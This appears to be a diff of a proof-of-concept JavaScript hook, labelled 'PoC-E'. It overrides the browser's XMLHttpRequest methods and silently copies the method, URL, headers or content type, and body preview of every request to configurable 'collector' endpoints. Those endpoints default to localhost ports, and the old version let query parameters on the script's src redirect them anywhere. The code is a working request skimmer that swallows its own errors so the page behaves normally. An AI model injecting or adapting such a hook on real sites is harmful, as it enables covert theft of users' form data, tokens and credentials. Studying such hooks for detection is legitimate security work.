@@ -1,106 +1,100 @@
-(function () {
-  function getCollectorUrlsFromCurrentScript() {
+(() => {
+  const cfg = window.__POC_E__ || {};
+  const collectorsCfg = (cfg && cfg.collectors) || {};
+
+  const COLLECTORS = [
+    collectorsCfg.c1 || "http://localhost:5001/mirror",
+    collectorsCfg.c2 || "http://localhost:5002/mirror",
+    collectorsCfg.c3 || "http://localhost:5003/mirror",
+  ].filter(Boolean);
+
+  function getSid() {
     try {
-      const src = document.currentScript && document.currentScript.src;
-      if (!src) return [];
-      const u = new URL(src);
-      const out = [];
-      for (const k of ["c1", "c2", "c3"]) {
-        const v = u.searchParams.get(k);
-        if (v && String(v).trim()) out.push(String(v).trim());
+      const el = document.getElementById("sidLabel");
+      if (el && el.textContent) return el.textContent.trim();
+    } catch (_) {}
+    return "";
+  }
+
+  function safeJsonParse(s) {
+    try { return JSON.parse(s); } catch (_) { return null; }
+  }
+
+  function mirrorSend(payload) {
+    const sid = getSid();
+    const body = JSON.stringify(payload);
+
+    for (const u of COLLECTORS) {
+      try {
+        fetch(u, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-BRS-Mirror": "1",
+            "X-POC-Session": sid,
+          },
+          body,
+          keepalive: true,
+        }).catch(() => {});
+      } catch (_) {}
+    }
+  }
+
+  const origOpen = XMLHttpRequest.prototype.open;
+  const origSend = XMLHttpRequest.prototype.send;
+  const origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
+
+  XMLHttpRequest.prototype.open = function (method, url) {
+    this.__poc_method = String(method || "GET").toUpperCase();
+    this.__poc_url = String(url || "");
+    return origOpen.apply(this, arguments);
+  };
+
+  XMLHttpRequest.prototype.setRequestHeader = function (k, v) {
+    try {
+      if (!this.__poc_headers) this.__poc_headers = {};
+      this.__poc_headers[String(k).toLowerCase()] = String(v);
+    } catch (_) {}
+    return origSetHeader.apply(this, arguments);
+  };
+
+  XMLHttpRequest.prototype.send = function (body) {
+    try {
+      const ct = (this.__poc_headers && this.__poc_headers["content-type"]) || "";
+
+      let bodyKind = "none";
+      let bodySize = 0;
+      let bodyPreview = null;
+
+      if (typeof body === "string") {
+        bodyKind = "string";
+        bodySize = body.length;
+        bodyPreview = body.slice(0, 500);
+      } else if (body instanceof FormData) {
+        bodyKind = "formdata";
+        bodySize = 0;
+        bodyPreview = "[FormData]";
+      } else if (body && typeof body === "object") {
+        bodyKind = "object";
+        const s = JSON.stringify(body);
+        bodySize = s.length;
+        bodyPreview = s.slice(0, 500);
       }
-      return out;
-    } catch (_) {
-      return [];
-    }
-  }
 
-  function defaultLocalCollectors() {
-    const h = location.hostname;
-    if (h === "localhost" || h === "127.0.0.1") {
-      return [
-        "http://localhost:5001/mirror",
-        "http://localhost:5002/mirror",
-        "http://localhost:5003/mirror",
-      ];
-    }
-    return [];
-  }
-
-  const COLLECTORS = (function () {
-    const qs = getCollectorUrlsFromCurrentScript();
-    if (qs.length) return qs;
-    return defaultLocalCollectors();
-  })();
-
-  function safeSend(url, payload, sessionId) {
-    try {
-      fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "X-BRS-Mirror": "1",
-          "X-POC-Session": sessionId || "",
-        },
-        body: JSON.stringify(payload),
-        keepalive: true,
-      }).catch(() => {});
-    } catch (_) {}
-  }
-
-  function newSessionId() {
-    return "poc-e-" + Math.random().toString(16).slice(2) + "-" + Date.now();
-  }
-
-  const SESSION_ID = newSessionId();
-
-  console.log("[PoC-E hook] loaded", { collectors: COLLECTORS, session: SESSION_ID });
-
-  const XHR = window.XMLHttpRequest;
-  if (!XHR || !XHR.prototype) return;
-
-  const _open = XHR.prototype.open;
-  const _send = XHR.prototype.send;
-  const _setRequestHeader = XHR.prototype.setRequestHeader;
-
-  XHR.prototype.open = function (method, url) {
-    try {
-      this.__pocE = this.__pocE || {};
-      this.__pocE.method = method;
-      this.__pocE.url = url;
-      this.__pocE.openTs = Date.now();
-    } catch (_) {}
-    return _open.apply(this, arguments);
-  };
-
-  XHR.prototype.setRequestHeader = function (k, v) {
-    try {
-      this.__pocE = this.__pocE || {};
-      this.__pocE.headers = this.__pocE.headers || [];
-      this.__pocE.headers.push([String(k), String(v)]);
-    } catch (_) {}
-    return _setRequestHeader.apply(this, arguments);
-  };
-
-  XHR.prototype.send = function (body) {
-    try {
-      const meta = this.__pocE || {};
-      const payload = {
-        kind: "xhr-mirror",
+      mirrorSend({
         ts: Date.now(),
-        method: meta.method,
-        url: meta.url,
-        headers: meta.headers || [],
-        body: typeof body === "string" ? body : body ? "[non-string]" : "",
         page: location.href,
-        origin: location.origin,
-      };
-
-      if (COLLECTORS.length) {
-        for (const c of COLLECTORS) safeSend(c, payload, SESSION_ID);
-      }
+        method: this.__poc_method,
+        url: this.__poc_url,
+        contentType: ct,
+        bodyKind,
+        bodySize,
+        bodyPreview,
+      });
     } catch (_) {}
 
-    return _send.apply(this, arguments);
+    return origSend.apply(this, arguments);
   };
+
+  console.log("[PoC-E hook] XHR prototype hooked. collectors=", COLLECTORS);
 })();
